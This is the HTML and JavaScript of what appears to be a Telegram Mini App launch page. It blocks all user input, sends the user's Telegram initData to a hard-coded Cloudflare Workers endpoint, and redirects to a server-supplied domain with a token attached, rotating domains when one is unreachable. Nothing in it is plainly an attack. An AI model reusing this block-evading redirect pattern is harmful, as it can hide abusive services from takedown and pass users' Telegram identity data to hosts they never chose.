<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'none'"/>
  <meta http-equiv="X-Frame-Options" content="DENY"/>
  <title>Init Redirect</title>
  <script src="https://telegram.org/js/telegram-web-app.js?59"></script>
<!--   <script>
    function closeApp() {
      // Telegram Web.
      try {
        window.parent.postMessage('web_app_close');
      } catch {
      }
      try {
        window.Telegram?.WebApp?.close()
      } catch {
      }

      // Telegram for iOS, macOS, Android and Telegram Desktop.
      try {
        window.TelegramWebviewProxy.postEvent('web_app_close');
      } catch {
      }

      // Telegram for Windows Phone or Android.
      try {
        window.external.notify('web_app_close')
      } catch {
      }

      location.replace('https://http.cat/status/599');
    }

    if (window.self !== window.top) {
      closeApp();
    }
  </script> -->
  <style>
      #visual-overlay {
          position: fixed;
          inset: 0;
          z-index: 2147483647;
          background: black;
          width: 100vw;
          height: 100dvh;
      }
  </style>
  <noscript>
    <style>
        html, body, html * {
            pointer-events: none !important;
            touch-action: none !important;
            cursor: default !important;
            -webkit-user-select: none !important;
            -moz-user-select: none !important;
            -ms-user-select: none !important;
            user-select: none !important;
            -webkit-touch-callout: none !important;
            -webkit-user-drag: none !important;
            user-drag: none !important;
            outline: none !important;
            caret-color: transparent !important;
            -webkit-tap-highlight-color: transparent !important;
        }

        html, body {
            overflow: hidden !important;
            scrollbar-width: none !important;
        }

        html::-webkit-scrollbar, body::-webkit-scrollbar {
            width: 0 !important;
            height: 0 !important;
        }
    </style>
  </noscript>

</head>
<body>
<div id="visual-overlay" aria-hidden="true"></div>

<script>
  (() => {
    const STOP_EVENTS = [
      // Pointer/mouse
      'click', 'dblclick', 'auxclick', 'mousedown', 'mouseup', 'mousemove', 'mouseenter', 'mouseleave',
      'pointerdown', 'pointerup', 'pointermove', 'pointerenter', 'pointerleave', 'pointercancel',
      'touchstart', 'touchend', 'touchmove', 'touchcancel',
      'wheel', 'scroll', 'gesturestart', 'gesturechange', 'gestureend',
      'dragstart', 'drag', 'dragend', 'drop',
      'keydown', 'keypress', 'keyup', 'compositionstart', 'compositionupdate', 'compositionend',
      'beforeinput', 'input', 'change', 'paste', 'copy', 'cut',
      'focus', 'blur', 'focusin', 'focusout', 'contextmenu',
      'submit', 'reset',
    ];

    const stopper = (e) => {
      try {
        e.stopImmediatePropagation();
      } catch {
      }
      try {
        e.stopPropagation();
      } catch {
      }
      try {
        if (typeof e.preventDefault === 'function') e.preventDefault();
      } catch {
      }
      return false;
    };

    const style = document.createElement('style');
    style.textContent = `
    html, body, html * {
      pointer-events: none !important;
      touch-action: none !important;
      cursor: default !important;
      -webkit-user-select: none !important;
      -moz-user-select: none !important;
      -ms-user-select: none !important;
      user-select: none !important;
      -webkit-touch-callout: none !important;
      -webkit-user-drag: none !important;
      user-drag: none !important;
      outline: none !important;
      caret-color: transparent !important;
      -webkit-tap-highlight-color: transparent !important;
    }
    html, body {
      overflow: hidden !important;
      scrollbar-width: none !important;
    }
    html::-webkit-scrollbar, body::-webkit-scrollbar { width: 0 !important; height: 0 !important; }
  `;
    (document.head || document.documentElement).appendChild(style);

    const applyInert = () => {
      if (document.body && !document.body.hasAttribute('inert')) {
        document.body.setAttribute('inert', '');
      }
    };

    const disableFocusables = (root = document) => {
      const focusables = root.querySelectorAll?.('a, button, input, select, textarea, details, summary, [contenteditable], [tabindex]');
      focusables?.forEach(el => {
        try {
          el.setAttribute('tabindex', '-1');
        } catch {
        }
        try {
          el.setAttribute('aria-disabled', 'true');
        } catch {
        }
        try {
          if ('disabled' in el) el.disabled = true;
        } catch {
        }
        for (const name of Object.getOwnPropertyNames(el)) {
          if (name.startsWith('on')) {
            try {
              el[name] = null;
            } catch {
            }
          }
        }
        for (const attr of Array.from(el.attributes || [])) {
          if (attr.name.startsWith('on')) {
            try {
              el.removeAttribute(attr.name);
            } catch {
            }
          }
        }
      });
    };

    const attachAll = () => {
      const targets = [window, document, document.documentElement, document.body].filter(Boolean);
      targets.forEach(t => {
        STOP_EVENTS.forEach(type => {
          try {
            t.addEventListener(type, stopper, {capture: true, passive: false});
          } catch {
          }
        });
      });
    };

    const mo = new MutationObserver(muts => {
      applyInert();
      for (const m of muts) {
        if (m.type === 'childList') {
          m.addedNodes.forEach(node => {
            if (node.nodeType === 1) {
              disableFocusables(node);
              for (const attr of Array.from(node.attributes || [])) {
                if (attr.name.startsWith('on')) {
                  try {
                    node.removeAttribute(attr.name);
                  } catch {
                  }
                }
              }
            }
          });
        } else if (m.type === 'attributes') {
          const el = m.target;
          if (m.attributeName === 'inert' && el === document.body && !el.hasAttribute('inert')) {
            applyInert();
          }
          if (m.attributeName && m.attributeName.startsWith('on')) {
            try {
              el.removeAttribute(m.attributeName);
            } catch {
            }
          }
        }
      }
    });

    const init = () => {
      applyInert();
      disableFocusables(document);
      attachAll();
      try {
        document.documentElement.style.overflow = 'hidden';
      } catch {
      }
      try {
        document.body && (document.body.style.overflow = 'hidden');
      } catch {
      }
      try {
        mo.observe(document.documentElement || document, {childList: true, subtree: true, attributes: true});
      } catch {
      }
    };

    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', init, {once: true});
    } else {
      init();
    }
  })();
</script>

<script>
  const fallbackUrl = 'https://http.cat/status/599';
  let tgStorage

  function getDate() {
    const now = new Date();

    return Date.UTC(
      now.getUTCFullYear(),
      now.getUTCMonth(),
      now.getUTCDate()
    );
  }

  function closeApp() {
    // Telegram Web.
    try {
      window.parent.postMessage('web_app_close');
    } catch {
    }
    try {
      window.Telegram?.WebApp?.close()
    } catch {
    }

    // Telegram for iOS, macOS, Android and Telegram Desktop.
    try {
      window.TelegramWebviewProxy.postEvent('web_app_close');
    } catch {
    }

    // Telegram for Windows Phone or Android.
    try {
      window.external.notify('web_app_close')
    } catch {
    }

    location.replace(fallbackUrl);
  }

  class CloudStorage {
    webApp;
    storage;
    initData;
    platform;

    constructor() {
      this.webApp = window.Telegram?.WebApp;
      this.storage = this.webApp?.CloudStorage;
      this.initData = this.webApp?.initData;
      this.platform = this.webApp?.platform;

      if (!this.webApp || !this.storage || !this.initData || !this.platform) {
        closeApp()
      }
    }

    async getValue(key, timeout = 8000) {
      return new Promise((resolve) => {
        const timeoutId = setTimeout(() => {
          resolve(null);
        }, timeout);

        try {
          this.storage.getItem(key, (err, value) => {
            clearTimeout(timeoutId);
            if (err || !value) {
              resolve(null);
            } else {
              resolve(value);
            }
          });
        } catch {
          clearTimeout(timeoutId);
          resolve(null);
        }
      });
    }

    async setValue(key, value, timeout = 8000) {
      return new Promise((resolve) => {
        const timeoutId = setTimeout(() => {
          resolve(false);
        }, timeout);

        try {
          this.storage.setItem(key, value, (err, status) => {
            clearTimeout(timeoutId);
            if (err || status !== true) {
              resolve(false);
            } else {
              resolve(status);
            }
          });
        } catch {
          clearTimeout(timeoutId);
          resolve(false);
        }
      })
    }

    async getJson(key, timeout = 8000) {
      try {
        const result = await this.getValue(key, timeout);
        if (!result) {
          return null
        }

        return JSON.parse(result)
      } catch {
        return null;
      }
    }

    async setJson(key, value, timeout = 8000) {
      try {
        const payload = JSON.stringify(value)
        const result = await this.setValue(key, payload, timeout);
        if (!result) {
          return false
        }

        return result
      } catch {
        return null;
      }
    }
  }

  function redirect({origin, pathname, token = null}) {
    try {
      const hostname = new URL(origin).hostname;
      const redirectUrl = new URL(window.location.href)
      redirectUrl.hostname = hostname;
      redirectUrl.protocol = 'https:';
      redirectUrl.pathname = (`/${pathname || ''}`).replace(/\/+$/, '') + '/';
      if (token)
        redirectUrl.searchParams.set('x-my-token', token);

      location.replace(redirectUrl.toString());

      setTimeout(closeApp, 10000);
    } catch (e) {
      closeApp()
    }
  }

  async function auth(origin, pathname = '/miniapp/api/auth/validate/') {
    try {
      const response = await fetch(new URL(pathname, origin), {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({initData: tgStorage.initData, platform: tgStorage.platform}),
      });


      if (!response.ok) {
        throw new Error('Unauthorized');
      }

      const data = await response.json();

      if (!data.origin || !data.pathname) {
        throw new Error('Unauthorized');
      }

      return data
    } catch (e) {
      throw new Error('Unauthorized');
    }
  }

  async function isDomainReachable(origin, timeout = 8000) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), timeout);

    try {
      const res = await fetch(new URL(origin), {
        mode: 'no-cors',
        signal: controller.signal,
        method: 'HEAD'
      });

      return res.type === 'opaque';
    } catch {
      return false;
    } finally {
      clearTimeout(timeoutId);
    }
  }

  async function run() {
    try {
      tgStorage = new CloudStorage();

      let reqState = await tgStorage.getJson('reqState')
      if (
        !reqState ||
        typeof reqState !== 'object' ||
        !['url', 'reqDate', 'reqCount'].every(k => k in reqState)
      ) {
        reqState = {
          url: '',
          reqDate: getDate(),
          reqCount: 0
        }
      }

      if (reqState.reqDate < getDate()) {
        reqState = {
          ...reqState,
          reqDate: getDate(),
          reqCount: 0
        }
        await tgStorage.setJson('reqState', reqState);
      }

      if (reqState?.url && await isDomainReachable(reqState.url)) {
        const data = await auth(reqState.url)

        return redirect(data);
      }

      if (reqState.reqCount >= 3 && reqState.reqDate === getDate()) {
        return closeApp()
      }

      reqState.reqCount++
      reqState.reqDate = getDate()
      await tgStorage.setJson('reqState', reqState)

      const newData = await auth('https://restless-hat-54ab.dev03.workers.dev', '');
      if (reqState.url === newData.origin) {
        return closeApp()
      }

      reqState.url = newData.origin
      await tgStorage.setJson('reqState', reqState)

      if (await isDomainReachable(newData.origin)) {
        return redirect(newData);
      } else {
        return closeApp()
      }
    } catch {
      closeApp()
    }
  }

  document.addEventListener("DOMContentLoaded", run);
</script>
</body>
</html>
